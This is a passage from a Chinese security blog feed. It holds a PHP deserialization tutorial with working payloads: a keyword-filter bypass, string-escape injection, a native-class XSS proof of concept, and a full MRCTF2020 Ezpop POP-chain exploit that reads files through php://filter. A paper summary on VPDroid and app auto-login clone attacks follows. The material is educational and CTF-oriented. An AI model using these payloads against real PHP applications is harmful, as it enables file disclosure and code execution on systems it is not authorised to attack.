class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h3><p>情况一：过滤后字符串变多<br>下面的代码是把反序列化后的一个x替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure><p>正常情况,传入<code>name=mao</code><br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-1.png"><br>如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-2.png"><br>接下来我们传入：<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，这一部分共20个字符，由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符，造成溢出，而输出了<code>woaini</code>。<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-3.png"></p><p>情况二：过滤后字符串变少<br>这次是把两个x替换为1个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure><p>正常情况传入<code>name=mao&amp;age=11</code>的结果<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-4.png"><br>构造payload，由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面的<code>&quot;</code>闭合了前面的参数，就可以实现自定义执行了。<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-5.png"></p><h2 id="PHP原生类反序列化利用"><a href="#PHP原生类反序列化利用" class="headerlink" title="PHP原生类反序列化利用"></a><a href="https://blog.csdn.net/qq_53287512/article/details/123879744">PHP原生类反序列化利用</a></h2><p>PHP原生类中存在很多魔术方法的使用，可以利用这些原生类构造POP链。<br>可以用下面的脚本来查看原生类中哪些方法可以被调用   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个简单的小例子看下如何利用。有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>构造POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>可以实现xss，虽然原来的代码中没有什么类可以利用，但利用原生类可以实现</p><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">CTF中的反序列化</a></p><h3 id="「MRCTF2020」-Ezpop"><a href="#「MRCTF2020」-Ezpop" class="headerlink" title="「MRCTF2020」- Ezpop"></a>「MRCTF2020」- Ezpop</h3><p>打开页面后出现下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想让上面的代码显示出flag，可以注意到Modifier中的include，这个可以利用PHP文件包含漏洞实现，但是要怎么才能执行呢，继续往下看<br>题目中有很多的魔术方法，从可控的入口出发一一总结在下面</p><ul><li>@unserialize 在反序列化时会自动调用 __wakeup 方法，判断Show类应当是入口</li><li>_wakeup 中 有 <code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code>，这里将 <code>$this-&gt;source</code> 当做字符串处理会触发 __toString 方法</li><li>__toString 方法中，访问属性source <code>$this-&gt;str-&gt;source</code> ，如果source不存在就会调用 <code>__get</code> ，所以这里的 $this-&gt;str 应当为 Test 类</li><li>__get 方法中，调用 <code>$function()</code> ，这里 p 应当为 Modifier 类，将类当做函数调用，会自动调用 __invoke 方法</li></ul><p>明白了POP链的构造，就可以利用伪协议构造出下面的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload后，访问<code>?pop=</code>，即可得到flag。<br>注* 使用 “php:&#x2F;&#x2F;filter”伪协议” 来进行包含。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p><h2 id="实战漏洞分析"><a href="#实战漏洞分析" class="headerlink" title="实战漏洞分析"></a>实战漏洞分析</h2><h3 id="Laravel-RCE（CVE-2021-3129"><a href="#Laravel-RCE（CVE-2021-3129" class="headerlink" title="Laravel RCE（CVE-2021-3129"></a>Laravel RCE（CVE-2021-3129</h3><p><a href="https://www.freebuf.com/vuls/280508.html">https://www.freebuf.com/vuls/280508.html</a></p><h3 id="Laravel-v11-x-CVE-2024-40075"><a href="#Laravel-v11-x-CVE-2024-40075" class="headerlink" title="Laravel v11.x (CVE-2024-40075)"></a>Laravel v11.x (CVE-2024-40075)</h3><p><a href="https://xz.aliyun.com/t/15127?time__1311=GqjxuQD=omwxlxGgx+xCqiKbn7wG8U3feD">https://xz.aliyun.com/t/15127?time__1311=GqjxuQD%3DomwxlxGgx%2BxCqiKbn7wG8U3feD</a></p><h3 id="CVE-2020-15148-Yii2"><a href="#CVE-2020-15148-Yii2" class="headerlink" title="CVE-2020-15148 Yii2"></a>CVE-2020-15148 Yii2</h3><p><a href="https://www.cnblogs.com/Aurora-M/p/15659232.html">https://www.cnblogs.com/Aurora-M/p/15659232.html</a></p><h3 id="CVE-2018-18753-Typecho"><a href="#CVE-2018-18753-Typecho" class="headerlink" title="CVE-2018-18753 Typecho"></a>CVE-2018-18753 Typecho</h3><p><a href="https://www.cnblogs.com/wuhongbin/p/15526142.html">https://www.cnblogs.com/wuhongbin/p/15526142.html</a></p><h3 id="CVE-2019-6340"><a href="#CVE-2019-6340" class="headerlink" title="CVE-2019-6340"></a>CVE-2019-6340</h3><p><a href="https://blog.csdn.net/shelter1234567/article/details/135187595">https://blog.csdn.net/shelter1234567/article/details/135187595</a></p><h3 id="phpBB-Phar-CVE-2018-19274"><a href="#phpBB-Phar-CVE-2018-19274" class="headerlink" title="phpBB Phar CVE-2018-19274"></a>phpBB Phar CVE-2018-19274</h3><p><a href="https://xz.aliyun.com/t/8239">https://xz.aliyun.com/t/8239</a></p><h3 id="CVE-2022-30287-Horde-Webmail"><a href="#CVE-2022-30287-Horde-Webmail" class="headerlink" title="CVE-2022-30287 Horde Webmail"></a>CVE-2022-30287 Horde Webmail</h3><p><a href="https://www.ctfiot.com/45607.html">https://www.ctfiot.com/45607.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】App’s Auto-Login Function Security Testing via Android OS-Level Virtualization</title>
      <link href="/2024/09/10/PaperReading/Auto-Login/"/>
      <url>/2024/09/10/PaperReading/Auto-Login/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>本文研究的问题是APP账号自动登录，首先刚看到题目我以为是那种手机上都会有自动输入账号密码的机制，读了文章之后了解到这里说的自动登录是登录状态的保持，比如微信，我们只需要在刚下载微信时输入账号密码进行登录，之后每次即便是关掉微信进程，也是一打开就是自动登录的，这也就省去了用户频繁输入账号和口令的麻烦。然而，在实际使用中，它易受到“data-clone attack”的威胁： 如果自动登录依赖的数据存储在本地，它可能会被攻击者克隆，导致攻击者可以突破登录设备数量限制或秘密登录受害者的帐户，从而损害APP运营者的合法权益或侵犯用户隐私和数据安全。对此，业界提出了设备一致性检查方案，只要发现APP运行设备环境发生变化，APP将禁止自动登录进而阻止克隆攻击。针对该问题，本文进一步研究发现该方案无法完全防御“data-clone attack”。该团队提出了一个具有良好透明性的虚拟化方案VPDroid， 可定制攻击所需的设备环境，以进行App自动登录的安全测试。该研究对应用市场中234个主流APP进行了测试，结果表明，通过VPDroid可有效绕过被测APP的一致性检查机制。在该成果的研究过程中，该团队发现了系列安全漏洞，近20个厂商对提交的漏洞给予了确认（其中包括1个CVE和近10项CNVD漏洞成果）。</p><p>具体什么是自动登录呢，如下图是我在作者的另一篇论文中找到的图片，可以看到当前已有设备登录账号，在另一手机登陆时会弹出仅能登录一个设备的提示。在安卓手机中，app通常使用用户登录凭证来实现自动登录，在首次登录成功之后，app将凭证数据保存在本地存储当中，下次登陆前进行验证，安卓提供了四种存储机制包括内部存储、外部存储、共享存储、数据库存储。相应的app数据会存储在对应路径当中，一般其它的应用是无法访问的。要实现克隆的话不仅需要克隆应用本身资源，为了防止这样的克隆行为，业界的解决方案是检查设备一致性，如设备电话号、序列号等信息，此类行为可能可以使用Xposed等框架hook相关函数进行绕过，但很多app也会有反调试措施，而且之前的相关工作当中仅hook了13个相关的标识信息，但本文通过调研发现了103个有关设备标识的信息。</p><p>本文通过定制了一个安卓虚拟机系统来实现了对设备标识的定制化修改，该修改对于app来说是透明的。Cells是一个轻量的安卓虚拟机系统，可以直接与硬件进行交互，他的主要机制是创建了一个独立的虚拟机命名空间，以此实现同真机系统的隔离，以及不同系统间的隔离，但是Cells也有很多局限性，它的灵活性弱，对新版本的安卓系统并不支持，同时缺少对蓝牙、GPS等设备的支持，而且对于app来说，可以发现Cells虚拟机的指纹信息，也就是说可以发现当前设备是虚拟机。</p><p>本文在Cells的基础上进行定制化，为了实现对app克隆的攻击模型，虚拟机需要满足两个条件，第一点是需要直接能够接触到硬件，第二点是可以定制化系统参数并且对app而言该操作是透明的。为了实现这些目标，本文主要采取两个方式，首先是针对在安卓ServiceManager中定义的服务，采用binder机制进行通信，binder机制是安卓系统引入的进程间通信的一种机制。第二种方法是，对于没有在ServiceManager中定义的服务，采用和真机交互的方式，设置通信代理。（RIL是一种和电话运营商网络交互的功能接口，RILD是在C++层的接口）</p><p>VPDroid系统整体概况图如图所示，虚拟出的安卓设备独立于主机，并可实现其中的参数定制。</p><p>那么怎么具体实现参数定制化呢，VPDroid提供了一个定制文件，修改其中的文件信息便可实现定制，对于安卓系统的参数信息，只需要将其中定制信息初始化在虚拟机内存中即可，对于用户层和内核层的定制化，则需要将其初始化在真机内存中。</p><p>本文采用了应用商店排名靠前的234个应用进行实验，在VPDroid中所有app都能实现绕过，作者也提出了建议，不要将认证凭证保存在本地、或者采用可信执行环境，但这样的开销也会加大，影响用户体验，本文最后也指出了VPDroid对于经root的用户来说还不是透明的，因为在采用代理通信时，VPDroid并未直接与RILD通信，也存在有相应的指纹信息。</p><h2 id="Professional-term"><a href="#Professional-term" class="headerlink" title="Professional term"></a>Professional term</h2><ul><li>original equipment manufacturer (OEM)（原始设备生产商）：</li><li>app克隆：深入挖掘APP克隆实验 - FreeBuf网络安全行业门户 Android 手机克隆&#x2F;一键换机原理初探_IT先森的博客-CSDN博客_手机克隆原理</li><li>Binder：安卓中进程间通信的一种机制 SourceAnalysis-1&#x2F;Binder源码分析.md at master · VPDroid&#x2F;SourceAnalysis-1 (github.com)</li><li>SELinux：SELinux 属于MAC的具体实现，增强了Linux系统的安全性。MAC机制的特点在于，资源的拥有者，并不能决定谁可以接入到资源。具体决定是否可以接入到资源，是基于安全策略。而安全策略则是有一系列的接入规则组成，并仅有特定权限的用户有权限操作安全策略</li><li>Android RIL概述：和电话运营商网络交互的功能接口Android RIL概述-CSDN博客</li></ul><h2 id="Thesaurus"><a href="#Thesaurus" class="headerlink" title="Thesaurus"></a>Thesaurus</h2><ul><li>client-side tampering vulnerabilities（客户端篡改漏洞）：In this paper, we focus on the security risk caused by mobile apps’ auto-login functions, which belongs to client-side tampering vulnerabilities.</li><li>hassle（麻烦）：It avoids the hassle of retyping user ID and password in a small keyboard when reaccessing the app.</li><li>In a nutshell（简而言之）：In a nutshell, we make the following three significant contributions.</li><li>backends（后端）：They exploit an entire class of apps that only rely on device-public information to authenticate the user to their backends.</li><li>seamlessly（无缝地）：For example, Smart Switch can seamlessly transfer app private data and home layouts between Galaxy devices, and it is similar for other OEM-made clone apps.</li><li>jeopardy（危险）：As a result, the user’s 